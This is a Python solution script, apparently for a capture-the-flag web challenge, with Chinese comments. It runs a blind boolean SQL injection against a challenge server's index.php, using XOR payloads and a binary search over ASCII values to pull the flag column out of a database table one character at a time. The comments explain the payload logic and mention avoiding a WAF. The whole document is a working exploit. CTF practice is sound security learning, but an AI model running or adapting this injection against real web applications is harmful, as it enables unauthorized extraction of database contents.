import requests
import time         #设置延时，避免得到flag乱码，也就是服务器waf，导致访问过快会有一段时间不能访问

url = "http://31680546-940d-4b76-906f-b0e4da67d8be.node4.buuoj.cn:81/index.php"
payload = {
    "id" : ""
}
result = ""
for i in range(1,100):
    l = 33              #ASCII起始值
    r =130              #ASCII结束值
    mid = (l+r)>>1      #二分
    while(l<r):
        payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)      #这一行的{0}对应format里的i,{1}对应format里的mid,由题面可知flag表中有flag字段信息
        html = requests.post(url,data=payload)
        print(payload)
        if "Hello" in html.text:              #这行判断是因为payload为0^1=1，对应的网页输出Hello, glzjin wants a girlfriend里面有Hello字符串，所以右侧条件为真，也就是当前flag字符对应的ASCII码值大于mid，要把区间右移
            l = mid+1
        else:
            r = mid
        mid = (l+r)>>1
    if(chr(mid)==" "):
        break
    result = result + chr(mid)
    print(result)
print("flag: " ,result)
